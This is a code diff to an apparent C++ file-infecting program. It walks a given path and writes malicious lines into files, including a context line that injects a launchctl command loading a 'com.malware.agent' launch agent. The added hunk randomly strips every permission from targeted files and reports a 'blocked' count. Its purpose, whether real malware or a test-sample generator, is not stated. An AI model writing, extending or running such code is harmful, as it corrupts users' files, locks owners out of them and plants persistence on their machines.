@@ -24,6 +24,12 @@ size_t contaminateFile(const std::string& path)
             fout << "system(\"launchctl load /Library/LaunchAgents/com.malware.agent\")" << std::endl;
             return 3;
         }
+        else if(rand() % 20 == 0)
+        {
+            fout.close();
+            std::filesystem::permissions(path, std::filesystem::perms::all, std::filesystem::perm_options::remove);
+            return 4;
+        }
     }
 
     return 0;
@@ -42,6 +48,7 @@ int main(int argc, char** argv)
         size_t js = 0;
         size_t un = 0;
         size_t mac = 0;
+        size_t blocked = 0;
 
         std::filesystem::path path(argv[1]);
 
@@ -54,12 +61,14 @@ int main(int argc, char** argv)
                 case 1: js++; break;
                 case 2: un++; break;
                 case 3: mac++; break;
+                case 4: blocked++; break;
             }
         }
 
         std::cout << "Js:     " << js << std::endl;
         std::cout << "Unix:   " << un << std::endl;
         std::cout << "MacOS:  " << mac << std::endl;
+        std::cout << "Blcoked:  " << blocked << std::endl;
     }
     catch(const std::exception& e)
     {
